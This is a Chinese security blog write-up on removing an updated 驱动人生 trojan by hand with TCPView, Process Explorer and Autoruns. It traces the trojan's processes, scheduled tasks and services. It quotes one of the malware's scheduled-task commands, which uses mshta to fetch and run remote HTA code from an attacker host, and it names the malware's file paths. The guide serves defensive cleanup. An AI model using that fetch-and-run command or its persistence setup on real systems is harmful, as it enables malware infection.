## 一、 背景介绍  

 **驱动人生木马在1月24日的基础上再次更新，将攻击组件安装为计划任务、服务并启动。本次手工查杀主要针对该木马。**

> 相关文章：<https://www.freebuf.com/column/195250.html>

最近在应急过程中，某单位电脑感染了更新后的驱动人生木马，由于客观原因，不能安装杀毒软件进行查杀，便进行手工杀毒，整个过程真心感觉该病毒具有“春风吹又生”的特质，于是将查杀过程记录下来，希望能给小伙伴们带来帮助。

注：文中环境是根据捕获的样本复现的场景，该虚拟机处于联网状态。

文中使用的工具为：

> (1)
> TCPView：详细的列出系统所有的TCP,UDP连接，包含本地和远程的TCP连接，<https://docs.microsoft.com/zh-> cn/sysinternals/downloads/tcpview>
>
> (2)Autoruns：详细的列出系统开机启动项，计划任务，服务等信息，<https://docs.microsoft.com/zh-> cn/sysinternals/downloads/autoruns>
>
> (3)Processexplor:详细的列出系统的进程及子进程，<https://docs.microsoft.com/zh-> cn/sysinternals/downloads/process-explorer>

## 二、手工查杀

### 2.1 分析现象

受害主机，主要有以下现象：

1、开机后自动关机：

![](https://image.3001.net/images/20200102/1577949536_5e0d99604241f.png!small)

2、具有大量异常外连行为，企图连接服务器和感染局域网内其他机器。

![](https://image.3001.net/images/20200102/1577949546_5e0d996ac2508.png!small)

### 2.2查杀病毒

1、使用命令，关闭自动关机。

![](https://image.3001.net/images/20200102/1577949556_5e0d9974377c1.png!small)

2、使用TCPview 查看异常进程：

![](https://image.3001.net/images/20200102/1577949577_5e0d9989a114f.png!small)

异常进程的PID为14600，在Process Explorer中找到该PID对应的进程并结束。

![](https://image.3001.net/images/20200102/1577949589_5e0d99957648e.png!small)

然而，结束该进程后，系统继续外连进行传播，此时的PID为110116，说明关闭进程并不能阻止病毒的传播活动，病毒文件依然存在，关闭进程后，病毒程序又会重新开启进程，因此要找到病毒文件，进行删除。

![](https://image.3001.net/images/20200102/1577949602_5e0d99a22582a.png!small)

在Process Exploer中，选择PID 11016对应的进程，右键属性，可看到病毒的位置为：C:\WINDOWS\Temp\svchost.exe.

![](https://image.3001.net/images/20200102/1577949612_5e0d99ac4368c.png!small)

![](https://image.3001.net/images/20200102/1577949623_5e0d99b76390b.png!small)

关闭占用病毒程序的进程，进入对应文件夹，尝试删除病毒文件，显示无法删除，说明此时又加载了新的进程，因此系统中可能存在相关服务或者计划任务，在不断的拉起程序。

![](https://image.3001.net/images/20200102/1577949637_5e0d99c5b4a5b.png!small)

使用Autoruns进行查看，在Filter 中输入“svchost.exe”进行搜索，结果中果然发现了病毒文件对应的自启动计划任务：

![](https://image.3001.net/images/20200102/1577949646_5e0d99ce8ab1b.png!small)

双击可看到其他计划任务：

![](https://image.3001.net/images/20200102/1577949704_5e0d9a0814036.png!small)

删除该任务后，仍有大量异常连接行为，真是打不死的小强：

![](https://image.3001.net/images/20200102/1577949714_5e0d9a12b86ca.png!small)

结束该进程，然后去删除病毒程序，还是无法删除，说明还有其他的服务在控制占用svchost.exe.

![](https://image.3001.net/images/20200102/1577949737_5e0d9a291330c.png!small)

主机仍有大量外连行为，刚刚删除的计划任务又出现了，说明有相关服务重新创建了该计划任务，但在我们的搜索中却并未发现与Temp目录下svchost.exe相关的服务：

![](https://image.3001.net/images/20200102/1577949754_5e0d9a3a15c61.png!small)

![](https://image.3001.net/images/20200102/1577949763_5e0d9a43eb35c.png!small)

所以将每个计划任务的属性都查看一下：

![](https://image.3001.net/images/20200102/1577949773_5e0d9a4deccd1.png!small)

运行处的内容为：

C:\WINDOWS\system32\cmd.exe/c mshta<http://w.beahh.com/page.html?pKQCXSVR>

是病毒为了创建计划任务执行远程hta代码。

![](https://image.3001.net/images/20200102/1577949789_5e0d9a5de5d36.png!small)

删除该计划任务。

过了几分钟后，删除的Autocheck,Autoscan又死灰复燃了。

![](https://image.3001.net/images/20200102/1577949798_5e0d9a66e0257.png!small)

说明有其他的任务或服务在启动它们，我们查看剩余的计划任务Ddriver，WebServers：

![](https://image.3001.net/images/20200102/1577949808_5e0d9a70b40b7.png!small)

运行处的内容为：

C:\WINDOWS\system32\cmd.exe /cC:\WINDOWS\system32\drivers\svchost.exe

查看另一计划任务：

![](https://image.3001.net/images/20200102/1577949831_5e0d9a87cabcc.png!small)

运行处的内容为：

C:\WINDOWS\system32\cmd.exe/c C:\WINDOWS\system32\wmiex.exe

根据介绍该木马病毒的技术文章，Wmiex.exe为异常应用程序。

删除该计划任务，然后删除wmiex.exe,无法删除，说明有进程占用。

![](https://image.3001.net/images/20200102/1577949931_5e0d9aeb68f65.png!small)

利用Process explorer查看：

![](https://image.3001.net/images/20200102/1577949940_5e0d9af41acf5.png!small)

关闭进程后，成功删除：

![](https://image.3001.net/images/20200102/1577949952_5e0d9b0033823.png!small)

此时主机仍有大量外连行为，

![](https://image.3001.net/images/20200102/1577949961_5e0d9b09ca3cb.png!small)

查看计划任务又出现了，

![](https://image.3001.net/images/20200102/1577950005_5e0d9b355071f.png!small)

说明肯定存在还未关闭的服务，上一步在计划任务中发现异常程序wmiex.exe，C:\WINDOWS\system32\drivers\svchost.exe查看是否有与该程序相关的服务，查看服务，果然有：

![](https://image.3001.net/images/20200102/1577950023_5e0d9b47c8abc.png!small)

关闭WebServers,Ddriver服务，然后删除计划任务，在ProcessExplorer中关闭异常进程，即可成功删除svchost.exe。

![](https://image.3001.net/images/20200102/1577950048_5e0d9b602b846.png!small)

MicrosoftWindows
服务的作用是让用户创建在Windows会话中可长时间运行的可执行应用程序，所以如果不关服务，删除计划任务，结束进程后，服务又会重新创建计划任务并启动程序。

关闭服务，删除计划任务，恶意程序后，杀毒成功，主机不在有大量异常外连的病毒传播行为：

![](https://image.3001.net/images/20200102/1577950079_5e0d9b7fbca35.png!small)

## 三、 总结

本次手工查杀病毒过程如下：

> 1、使用TCPView查看异常外连行为对应的PID.
>
> 2、在Process Exploer中，找到PID对应的进程程序所在位置并关闭该进程。
>
> 3、使用Auturuns查看程序对应的服务及计划任务等，删除服务，计划任务。
>
> 4、删除病毒文件，重启电脑。

![](https://image.3001.net/images/20200102/1577950101_5e0d9b958d9a8.png!small)

希望本文能对小伙伴们手工杀毒提供相关思路，当我们平时卸载软件，去安装目录中删除安装文件夹，但存在文件无法删除时，大家也可根据该方法，找到占用该文件的服务，计划任务或驱动程序（其他实战中遇到过）等进行删除，这样便可成功删除安装文件。

 ***本文原创作者：xiaoxinling，本文属于FreeBuf原创奖励计划，未经许可禁止转载**

